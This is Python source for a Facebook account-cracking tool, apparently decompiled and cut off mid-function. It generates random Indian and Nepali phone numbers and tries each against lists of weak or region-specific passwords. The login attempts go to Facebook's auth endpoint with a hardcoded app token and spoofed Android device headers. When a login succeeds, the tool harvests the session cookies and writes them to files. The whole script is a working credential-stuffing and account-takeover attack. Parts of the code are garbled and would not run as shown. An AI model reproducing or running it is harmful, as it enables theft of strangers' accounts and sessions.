                habib.submit(rndm2, uid, passlist)
            if mthd in ('3', '03'):
                habib.submit(rndm3, uid, passlist)
            if mthd in ('4', '04'):
                habib.submit(rndm4, uid, passlist)
            None(None, None)
            if not ''.join:
                pass
    print('\x1b[1;37m')
    print('\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;37m')
    print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m THE PROCESS HAS COMPLETED''')
    print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m TOTAL OK ID : ''' + str(len(oks)))
    print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m TOTAL CP ID : ''' + str(len(cps)))
    print('\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;37m')
    input(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m PRESS ENTER TO BACK ''')
    menu()


def india():
    user = []
    clear()
    print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : +91639 | +91934 | +91902 | +91937 ''')
    print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    code = input(f'''\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : ''')
    clear()
    print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : 3000 | 5000 | 10000 | 99999 ''')
    print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    limit = int(input(f'''\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : '''))
    clear()
    print(f'''\x1b[38;5;244m({A}1\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M1\x1b[38;5;244m)\n\x1b[38;5;244m({A}2\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M2\x1b[38;5;244m)\n\x1b[38;5;244m({A}3\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M3\x1b[38;5;244m)\n\x1b[38;5;244m({A}4\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M4\x1b[38;5;244m)''')
    print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    mthd = input(f'''\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : ''')
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        habib = tred(max_workers = 30)
        clear()
        tl = str(len(user))
        print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m SIM CODE :{A} {code} ''')
        print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m TOTAL ID :{A} {tl} ''')
        print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE{B}[{A}M{mthd}{B}]''')
        print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for psx in user:
            uid = code + psx
            passlist = [
                uid,
                psx,
                uid[:8],
                uid[:7],
                uid[:6],
                '57273200',
                '59039200',
                '57575751']
            if mthd in ('1', '01'):
                habib.submit(rndm1, uid, passlist)
            if mthd in ('2', '02'):
                habib.submit(rndm2, uid, passlist)
            if mthd in ('3', '03'):
                habib.submit(rndm3, uid, passlist)
            if mthd in ('4', '04'):
                habib.submit(rndm4, uid, passlist)
            None(None, None)
            if not ''.join:
                pass
    print('\x1b[1;37m')
    print('\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;37m')
    print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m THE PROCESS HAS COMPLETED''')
    print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m TOTAL OK ID : ''' + str(len(oks)))
    print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m TOTAL CP ID : ''' + str(len(cps)))
    print('\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;37m')
    input(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m PRESS ENTER TO BACK ''')
    menu()


def nepal():
    user = []
    clear()
    print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : 9815 | 9814 | 9861 | 9840 ''')
    print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    code = input(f'''\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : ''')
    clear()
    print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : 3000 | 5000 | 10000 | 99999 ''')
    print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    limit = int(input(f'''\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : '''))
    clear()
    print(f'''\x1b[38;5;244m({A}1\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M1\x1b[38;5;244m)\n\x1b[38;5;244m({A}2\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M2\x1b[38;5;244m)\n\x1b[38;5;244m({A}3\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M3\x1b[38;5;244m)\n\x1b[38;5;244m({A}4\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M4\x1b[38;5;244m)''')
    print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    mthd = input(f'''\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : ''')
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(6)())
        user.append(nmp)
        habib = tred(max_workers = 30)
        clear()
        tl = str(len(user))
        print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m SIM CODE :{A} {code} ''')
        print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m TOTAL ID :{A} {tl} ''')
        print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE{B}[{A}M{mthd}{B}]''')
        print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for psx in user:
            uid = code + psx
            passlist = [
                uid,
                psx,
                uid[:8],
                uid[:7],
                uid[:6],
                'nepal12',
                'nepal123',
                'nepal1234',
                'nepal12345',
                'maya123',
                'kathmandu',
                'pokhara',
                'tamang',
                'maya1234',
                'tamang123',
                'tamang12345',
                'nepal@123',
                'kathmandu123']
            if mthd in ('1', '01'):
                habib.submit(rndm1, uid, passlist)
            if mthd in ('2', '02'):
                habib.submit(rndm2, uid, passlist)
            if mthd in ('3', '03'):
                habib.submit(rndm3, uid, passlist)
            if mthd in ('4', '04'):
                habib.submit(rndm4, uid, passlist)
            None(None, None)
            if not ''.join:
                pass
    print('\x1b[1;37m')
    print('\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;37m')
    print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m THE PROCESS HAS COMPLETED''')
    print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m TOTAL OK ID : ''' + str(len(oks)))
    print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m TOTAL CP ID : ''' + str(len(cps)))
    print('\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;37m')
    input(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m PRESS ENTER TO BACK ''')


def api1(ids, names, passlist):
    global loop
    sys.stdout.write(f'''\r\r\x1b[38;5;244m(\x1b[38;5;46m{date}\x1b[38;5;244m)\x1b[38;5;46m[ALONE-[💚]<>[\x1b[38;5;46m%s\x1b[38;5;46m]\x1b[38;5;46m<>[\x1b[38;5;46mOK\x1b[38;5;244m/\x1b[38;5;46mCP]<>[\x1b[38;5;46m%s\x1b[38;5;244m/\x1b[38;5;46m%s]''' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    fn = names.split(' ')[0]
    ln = names.split(' ')[1]
    ln = fn
    for pw in passlist:
        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
        fbbv = str(random.randint(111111111, 999999999))
        android_version = device['android_version']
        model = device['model']
        build = device['build']
        fblc = device['fblc']
        fbcr = sim_id
        fbmf = device['fbmf']
        fbbd = device['fbbd']
        fbdv = device['fbdv']
        fbsv = device['fbsv']
        fbca = device['fbca']
        fbdm = device['fbdm']
        fbfw = '1'
        fbrv = '0'
        fban = 'FB4A'
        fbpn = 'com.facebook.katana'
        ua = 'Davik/2.1.0 (Linux; U; Android ' + android_version + '.0.1; ' + model + ' Build/' + build + ') [FBAN/' + fban + ';FBAV/' + fbav + ';FBBV/' + fbbv + ';FBDM/{density=2.625,width=1080,height=1920};FBLC/' + fblc + ';FBRV/' + str(random.randint(0, 999999999)) + ';FBCR/' + fbcr + ';FBMF/' + fbmf + ';FBBD/' + fbbd + ';FBPN/' + fbpn + ';FBDV/' + fbdv + ';FBSV/' + fbsv + ';FBOP/19;FBCA/' + fbca + ';]'
        random_seed = random.Random()
        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
        device_id = str(uuid.uuid4())
        secure = str(uuid.uuid4())
        family = str(uuid.uuid4())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
        sim_serials = f'''["{xd}"]'''
        li = [
            '28',
            '29',
            '210']
        li2 = random.choice(li)
        j1 = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(2)())
        jazoest = li2 + j1
        data = {
            'tier': 'regular',
            'reg_instance': str(uuid.uuid4()),
            'meta_inf_fbmeta': '',
            'currently_logged_in_userid': '0',
            'locale': fblc,
            'client_country_code': '',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
        headers = {
            'Authorization': f'''OAuth {accessToken}''',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(2e+07, 3e+07)),
            'X-FB-Net-HNI': str(random.randint(11111, 99999)),
            'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
            'User-Agent': HOP_M1(),
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger' }
        url = 'https://graph.facebook.com/auth/login'
        po = requests.post(url, data = data, headers = headers).json()
        if 'session_key' in po:
            print('\r\r\x1b[38;5;244m(\x1b[38;5;46mALONE-OK[💚]\x1b[38;5;244m)\x1b[38;5;46m ' + ids + ' ━\x1b[38;5;244m➤\x1b[38;5;46m ' + pas + '\x1b[1;97m')
            coki = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
            print(f'''\r\r\x1b[38;5;244m=(\x1b[38;5;46m💚\x1b[38;5;244m)={A}\x1b[38;5;81m ''' + coki)
            print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
            open('/sdcard/ALONE-FILE-M1-OK.txt', 'a').write(ids + ' | ' + pas + ' |-> ' + coki + '\n')
            oks.append(ids)
            ';'.join
        if 'www.facebook.com' in po['error']['message']:
            if 'y' in pcp:
                print(f'''\r\r\x1b[38;5;244m({Y}ALONE-CP[🖤]\x1b[38;5;244m){Y} ''' + ids + ' | ' + pas + '\x1b[1;97m')
                open('/sdcard/ALONE-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(ids)
                '1'
            'generate_machine_id'
        loop += 1
        return None
        if Exception:
            e = '1'
            e = None
            del e
            return None
        e = '1'
        del e


def api2(ids, names, passlist):
    global loop
    sys.stdout.write(f'''\r\r\x1b[38;5;244m(\x1b[38;5;46m{date}\x1b[38;5;244m)\x1b[38;5;46m[ALONE-[💚]<>[\x1b[38;5;46m%s\x1b[38;5;46m]\x1b[38;5;46m<>[\x1b[38;5;46mOK\x1b[38;5;244m/\x1b[38;5;46mCP]<>[\x1b[38;5;46m%s\x1b[38;5;244m/\x1b[38;5;46m%s]''' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    fn = names.split(' ')[0]
    ln = names.split(' ')[1]
    ln = fn
    for pw in passlist:
        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
        fbbv = str(random.randint(111111111, 999999999))
        android_version = device['android_version']
        model = device['model']
        build = device['build']
        fblc = device['fblc']
        fbcr = sim_id
        fbmf = device['fbmf']
        fbbd = device['fbbd']
        fbdv = device['fbdv']
        fbsv = device['fbsv']
        fbca = device['fbca']
        fbdm = device['fbdm']
        fbfw = '1'
        fbrv = '0'
        fban = 'FB4A'
        fbpn = 'com.facebook.katana'
        ua = 'Davik/2.1.0 (Linux; U; Android ' + android_version + '.0.1; ' + model + ' Build/' + build + ') [FBAN/' + fban + ';FBAV/' + fbav + ';FBBV/' + fbbv + ';FBDM/{density=2.625,width=1080,height=1920};FBLC/' + fblc + ';FBRV/' + str(random.randint(0, 999999999)) + ';FBCR/' + fbcr + ';FBMF/' + fbmf + ';FBBD/' + fbbd + ';FBPN/' + fbpn + ';FBDV/' + fbdv + ';FBSV/' + fbsv + ';FBOP/19;FBCA/' + fbca + ';]'
        random_seed = random.Random()
        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
        device_id = str(uuid.uuid4())
        secure = str(uuid.uuid4())
        family = str(uuid.uuid4())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
        sim_serials = f'''["{xd}"]'''
        li = [
            '28',
            '29',
            '210']
        li2 = random.choice(li)
        j1 = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(2)())
        jazoest = li2 + j1
        data = {
            'tier': 'regular',
            'reg_instance': str(uuid.uuid4()),
            'meta_inf_fbmeta': '',
            'currently_logged_in_userid': '0',
            'locale': fblc,
            'client_country_code': '',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
        headers = {
            'Authorization': f'''OAuth {accessToken}''',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(2e+07, 3e+07)),
            'X-FB-Net-HNI': str(random.randint(11111, 99999)),
            'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
            'User-Agent': HOP_M2(),
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger' }
        url = 'https://graph.facebook.com/auth/login'
        po = requests.post(url, data = data, headers = headers).json()
        if 'session_key' in po:
            print('\r\r\x1b[38;5;244m(\x1b[38;5;46mALONE-OK[💚]\x1b[38;5;244m)\x1b[38;5;46m ' + ids + ' ━\x1b[38;5;244m➤\x1b[38;5;46m ' + pas + '\x1b[1;97m')
            coki = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
            print(f'''\r\r\x1b[38;5;244m=(\x1b[38;5;46m💚\x1b[38;5;244m)={A}\x1b[38;5;81m ''' + coki)
            print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
            open('/sdcard/ALONE-FILE-M1-OK.txt', 'a').write(ids + ' | ' + pas + ' |-> ' + coki + '\n')
            oks.append(ids)
            ';'.join
        if 'www.facebook.com' in po['error']['message']:
            if 'y' in pcp:
                print(f'''\r\r\x1b[38;5;244m({Y}ALONE-CP[🖤]\x1b[38;5;244m){Y} ''' + ids + ' | ' + pas + '\x1b[1;97m')
                open('/sdcard/ALONE-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(ids)
                '1'
            'generate_machine_id'
        loop += 1
        return None
        if Exception:
            e = '1'
            e = None
            del e
            return None
        e = '1'
        del e


def api3(ids, names, passlist):
    global loop
    sys.stdout.write(f'''\r\r\x1b[38;5;244m(\x1b[38;5;46m{date}\x1b[38;5;244m)\x1b[38;5;46m[ALONE-[💚]<>[\x1b[38;5;46m%s\x1b[38;5;46m]\x1b[38;5;46m<>[\x1b[38;5;46mOK\x1b[38;5;244m/\x1b[38;5;46mCP]<>[\x1b[38;5;46m%s\x1b[38;5;244m/\x1b[38;5;46m%s]''' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    fn = names.split(' ')[0]
    ln = names.split(' ')[1]
    ln = fn
    for pw in passlist:
        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
        fbbv = str(random.randint(111111111, 999999999))
        android_version = device['android_version']
        model = device['model']
        build = device['build']
        fblc = device['fblc']
        fbcr = sim_id
        fbmf = device['fbmf']
        fbbd = device['fbbd']
        fbdv = device['fbdv']
        fbsv = device['fbsv']
        fbca = device['fbca']
        fbdm = device['fbdm']
        fbfw = '1'
        fbrv = '0'
        fban = 'FB4A'
        fbpn = 'com.facebook.katana'
        ua = 'Davik/2.1.0 (Linux; U; Android ' + android_version + '.0.1; ' + model + ' Build/' + build + ') [FBAN/' + fban + ';FBAV/' + fbav + ';FBBV/' + fbbv + ';FBDM/{density=2.625,width=1080,height=1920};FBLC/' + fblc + ';FBRV/' + str(random.randint(0, 999999999)) + ';FBCR/' + fbcr + ';FBMF/' + fbmf + ';FBBD/' + fbbd + ';FBPN/' + fbpn + ';FBDV/' + fbdv + ';FBSV/' + fbsv + ';FBOP/19;FBCA/' + fbca + ';]'
        random_seed = random.Random()
        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
        device_id = str(uuid.uuid4())
        secure = str(uuid.uuid4())
        family = str(uuid.uuid4())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
        sim_serials = f'''["{xd}"]'''
        li = [
            '28',
            '29',
            '210']
        li2 = random.choice(li)
        j1 = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(2)())
        jazoest = li2 + j1
        data = {
            'tier': 'regular',
            'reg_instance': str(uuid.uuid4()),
            'meta_inf_fbmeta': '',
            'currently_logged_in_userid': '0',
            'locale': fblc,
            'client_country_code': '',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
        headers = {
            'Authorization': f'''OAuth {accessToken}''',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(2e+07, 3e+07)),
            'X-FB-Net-HNI': str(random.randint(11111, 99999)),
            'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
            'User-Agent': HOP_M3(),
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger' }
        url = 'https://graph.facebook.com/auth/login'
        po = requests.post(url, data = data, headers = headers).json()
        if 'session_key' in po:
            print('\r\r\x1b[38;5;244m(\x1b[38;5;46mALONE-OK[💚]\x1b[38;5;244m)\x1b[38;5;46m ' + ids + ' ━\x1b[38;5;244m➤\x1b[38;5;46m ' + pas + '\x1b[1;97m')
            coki = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
            print(f'''\r\r\x1b[38;5;244m=(\x1b[38;5;46m💚\x1b[38;5;244m)={A} ''' + coki)
            print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
            open('/sdcard/ALONE-FILE-M1-OK.txt', 'a').write(ids + ' | ' + pas + ' |-> ' + coki + '\n')
            oks.append(ids)
            ';'.join
        if 'www.facebook.com' in po['error']['message']:
            if 'y' in pcp:
                print(f'''\r\r\x1b[38;5;244m({Y}ALONE-CP[🖤]\x1b[38;5;244m){Y} ''' + ids + ' | ' + pas + '\x1b[1;97m')
                open('/sdcard/ALONE-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(ids)
                '1'
            'generate_machine_id'
        loop += 1
        return None
        if Exception:
            e = '1'
            e = None
            del e
            return None
        e = '1'
        del e


def api4(ids, names, passlist):
    global loop
    sys.stdout.write(f'''\r\r\x1b[38;5;244m(\x1b[38;5;46m{date}\x1b[38;5;244m)\x1b[38;5;46m[ALONE-[💚]<>[\x1b[38;5;46m%s\x1b[38;5;46m]\x1b[38;5;46m<>[\x1b[38;5;46mOK\x1b[38;5;244m/\x1b[38;5;46mCP]<>[\x1b[38;5;46m%s\x1b[38;5;244m/\x1b[38;5;46m%s]''' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    fn = names.split(' ')[0]
    ln = names.split(' ')[1]
    ln = fn
    for pw in passlist:
        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
        fbbv = str(random.randint(111111111, 999999999))
        android_version = device['android_version']
        model = device['model']
        build = device['build']
        fblc = device['fblc']
        fbcr = sim_id
        fbmf = device['fbmf']
        fbbd = device['fbbd']
        fbdv = device['fbdv']
        fbsv = device['fbsv']
        fbca = device['fbca']
        fbdm = device['fbdm']
        fbfw = '1'
        fbrv = '0'
        fban = 'FB4A'
        fbpn = 'com.facebook.katana'
        ua = 'Davik/2.1.0 (Linux; U; Android ' + android_version + '.0.1; ' + model + ' Build/' + build + ') [FBAN/' + fban + ';FBAV/' + fbav + ';FBBV/' + fbbv + ';FBDM/{density=2.625,width=1080,height=1920};FBLC/' + fblc + ';FBRV/' + str(random.randint(0, 999999999)) + ';FBCR/' + fbcr + ';FBMF/' + fbmf + ';FBBD/' + fbbd + ';FBPN/' + fbpn + ';FBDV/' + fbdv + ';FBSV/' + fbsv + ';FBOP/19;FBCA/' + fbca + ';]'
        random_seed = random.Random()
        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
        device_id = str(uuid.uuid4())
        secure = str(uuid.uuid4())
        family = str(uuid.uuid4())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
        sim_serials = f'''["{xd}"]'''
        li = [
            '28',
            '29',
            '210']
        li2 = random.choice(li)
        j1 = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(2)())
        jazoest = li2 + j1
        data = {
            'tier': 'regular',
            'reg_instance': str(uuid.uuid4()),
            'meta_inf_fbmeta': '',
            'currently_logged_in_userid': '0',
            'locale': fblc,
            'client_country_code': '',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
        headers = {
            'Authorization': f'''OAuth {accessToken}''',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(2e+07, 3e+07)),
            'X-FB-Net-HNI': str(random.randint(11111, 99999)),
            'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
            'User-Agent': HOP_M4(),
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger' }
        url = 'https://graph.facebook.com/auth/login'
        po = requests.post(url, data = data, headers = headers).json()
        if 'session_key' in po:
            print('\r\r\x1b[38;5;244m(\x1b[38;5;46mALONE-OK[💚]\x1b[38;5;244m)\x1b[38;5;46m ' + ids + ' ━\x1b[38;5;244m➤\x1b[38;5;46m ' + pas + '\x1b[1;97m')
            coki = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
            print(f'''\r\r\x1b[38;5;244m=(\x1b[38;5;46m💚\x1b[38;5;244m)={A} ''' + coki)
            print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
            open('/sdcard/ALONE-FILE-M1-OK.txt', 'a').write(ids + ' | ' + pas + ' |-> ' + coki + '\n')
            oks.append(ids)
            ';'.join
        if 'www.facebook.com' in po['error']['message']:
            if 'y' in pcp:
                print(f'''\r\r\x1b[38;5;244m({Y}ALONE-CP[🖤]\x1b[38;5;244m){Y} ''' + ids + ' | ' + pas + '\x1b[1;97m')
                open('/sdcard/ALONE-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(ids)
                '1'
            'generate_machine_id'
        loop += 1
        return None
        if Exception:
            e = '1'
            e = None
            del e
            return None
        e = '1'
        del e


def api5(ids, names, passlist):
    global loop
    sys.stdout.write(f'''\r\r\x1b[38;5;244m(\x1b[38;5;46m{date}\x1b[38;5;244m)\x1b[38;5;46m[ALONE-[💚]<>[\x1b[38;5;46m%s\x1b[38;5;46m]\x1b[38;5;46m<>[\x1b[38;5;46mOK\x1b[38;5;244m/\x1b[38;5;46mCP]<>[\x1b[38;5;46m%s\x1b[38;5;244m/\x1b[38;5;46m%s]''' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    fn = names.split(' ')[0]
    ln = names.split(' ')[1]
    ln = fn
    for pw in passlist:
        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
        fbbv = str(random.randint(111111111, 999999999))
        android_version = device['android_version']
        model = device['model']
        build = device['build']
        fblc = device['fblc']
        fbcr = sim_id
        fbmf = device['fbmf']
        fbbd = device['fbbd']
        fbdv = device['fbdv']
        fbsv = device['fbsv']
        fbca = device['fbca']
        fbdm = device['fbdm']
        fbfw = '1'
        fbrv = '0'
        fban = 'FB4A'
        fbpn = 'com.facebook.katana'
        ua = 'Davik/2.1.0 (Linux; U; Android ' + android_version + '.0.1; ' + model + ' Build/' + build + ') [FBAN/' + fban + ';FBAV/' + fbav + ';FBBV/' + fbbv + ';FBDM/{density=2.625,width=1080,height=1920};FBLC/' + fblc + ';FBRV/' + str(random.randint(0, 999999999)) + ';FBCR/' + fbcr + ';FBMF/' + fbmf + ';FBBD/' + fbbd + ';FBPN/' + fbpn + ';FBDV/' + fbdv + ';FBSV/' + fbsv + ';FBOP/19;FBCA/' + fbca + ';]'
        random_seed = random.Random()
        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
        device_id = str(uuid.uuid4())
        secure = str(uuid.uuid4())
        family = str(uuid.uuid4())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
        sim_serials = f'''["{xd}"]'''
        li = [
            '28',
            '29',
            '210']
        li2 = random.choice(li)
        j1 = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(2)())
        jazoest = li2 + j1
        data = {
            'tier': 'regular',
            'reg_instance': str(uuid.uuid4()),
            'meta_inf_fbmeta': '',
            'currently_logged_in_userid': '0',
            'locale': fblc,
            'client_country_code': '',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
        headers = {
            'Authorization': f'''OAuth {accessToken}''',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(2e+07, 3e+07)),
            'X-FB-Net-HNI': str(random.randint(11111, 99999)),
            'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
